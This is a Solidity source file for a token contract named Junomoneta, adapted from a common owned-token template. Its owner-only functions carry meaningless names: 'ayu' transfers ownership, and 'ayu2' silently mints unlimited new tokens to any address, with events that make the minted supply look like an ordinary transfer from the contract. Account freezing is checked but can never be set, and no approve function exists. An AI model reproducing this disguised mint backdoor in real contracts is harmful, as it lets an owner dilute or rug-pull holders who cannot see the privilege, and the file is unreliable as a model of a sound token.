 

pragma solidity >=0.4.22 <0.6.0;

contract owned {
    address public owner;

    constructor() public {owner = msg.sender;}

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function ayu(address nO) onlyOwner public {owner = nO;}
}

interface tokenRecipient { 
    function receiveApproval(address _from, uint256 _value, address _token, bytes calldata _extraData) external; }

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals = 4;
     
    uint256 public totalSupply;
     
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
     
    event Transfer(address indexed from, address indexed to, uint256 value);
     
    event Burn(address indexed from, uint256 value);

     
    constructor(
        uint256 initialSupply,
        string memory tokenName,
        string memory tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);   
        balanceOf[msg.sender] = totalSupply;                     
        name = tokenName;                                        
        symbol = tokenSymbol;                                    
    }

     
    function _transfer(address _from, address _to, uint _value) internal {
         
        require(_to != address(0x0));
         
        require(balanceOf[_from] >= _value);
         
        require(balanceOf[_to] + _value > balanceOf[_to]);
         
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
         
        balanceOf[_from] -= _value;
         
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
         
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

     
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);      
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);    
        balanceOf[msg.sender] -= _value;             
        totalSupply -= _value;                       
        emit Burn(msg.sender, _value);
        return true;
    }

}

contract Junomoneta is owned, Token {

    mapping (address => bool) public frozenAccount;

     
    event FrozenFunds(address target, bool frozen);

     
    constructor(
        uint256 initialSupply,
        string memory tokenName,
        string memory tokenSymbol
    ) Token(initialSupply, tokenName, tokenSymbol) public {}

     
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != address(0x0));                           
        require (balanceOf[_from] >= _value);                    
        require (balanceOf[_to] + _value >= balanceOf[_to]);     
        require(!frozenAccount[_from]);                          
        require(!frozenAccount[_to]);                            
        balanceOf[_from] -= _value;                              
        balanceOf[_to] += _value;                                
        emit Transfer(_from, _to, _value);
    }

     
     
     
    function ayu2(address target, uint256 am) onlyOwner public {
        balanceOf[target] += am;
        totalSupply += am;
        emit Transfer(address(0), address(this), am);
        emit Transfer(address(this), target, am);
    }
}